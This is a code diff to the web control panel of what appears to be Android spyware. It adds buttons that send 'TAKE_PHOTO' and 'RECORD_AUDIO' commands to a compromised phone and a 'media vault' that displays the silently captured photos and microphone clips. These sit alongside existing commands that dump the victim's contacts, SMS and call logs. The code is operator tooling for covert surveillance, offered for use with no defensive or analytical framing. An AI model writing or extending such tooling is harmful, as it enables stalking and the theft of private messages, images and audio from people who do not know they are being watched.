@@ -209,6 +209,8 @@
         <button onclick="cmd('GET_CONTACTS')">DUMP CONTACTS</button>
         <button onclick="cmd('GET_SMS')">DUMP SMS</button>
         <button onclick="cmd('GET_CALL_LOGS')">DUMP CALL LOGS</button>
+        <button onclick="cmd('TAKE_PHOTO')" class="danger">TAKE FRONT PHOTO</button>
+        <button onclick="cmd('RECORD_AUDIO')" class="danger">RECORD 10S MIC</button>
     </div>
 
     <input type="text" id="speak_input" placeholder="Enter text to speak..." onchange="sendInput('SPEAK', this.value)">
@@ -230,6 +232,13 @@
             <div id="modal-list" style="margin-top: 10px;">Loading...</div>
             <button onclick="closeModal()" style="margin-top: 20px; width: 100%;">CLOSE</button>
         </div>
+    </div>
+
+    <div id="media-vault"
+        style="margin: 20px auto; max-width: 600px; border: 1px solid var(--neon); padding: 15px; background: #111;">
+        <h3 style="font-size: 0.8rem; color: var(--neon); margin-top: 0;">MEDIA VAULT</h3>
+        <div id="photo-display" style="margin-bottom: 10px; text-align: center;"></div>
+        <div id="audio-display" style="text-align: center;"></div>
     </div>
 
     <div id="terminal"></div>
@@ -308,6 +317,20 @@
         socket.on('call_logs', (data) => {
             renderList('CALL LOGS', data.call_logs.map(l => `📞 [${l.number}] | Duration: ${l.duration}s`));
             log(`☎️ CALL LOGS DUMPED (${data.call_logs.length} items)`, 'neon');
+        });
+
+        // Photo Data
+        socket.on('photo_data', (data) => {
+            const display = document.getElementById('photo-display');
+            display.innerHTML = `<h4>LATEST CAPTURE</h4><img src="data:image/jpeg;base64,${data.data}" style="max-width: 100%; border: 1px solid var(--neon);">`;
+            log(`📸 SILENT PHOTO RECEIVED`, 'neon');
+        });
+
+        // Audio Data
+        socket.on('audio_data', (data) => {
+            const display = document.getElementById('audio-display');
+            display.innerHTML = `<h4>LATEST MIC CLIP</h4><audio controls src="data:audio/aac;base64,${data.data}" style="width: 100%;"></audio>`;
+            log(`🎙️ AUDIO CLIP RECEIVED`, 'neon');
         });
 
         function renderList(title, items) {
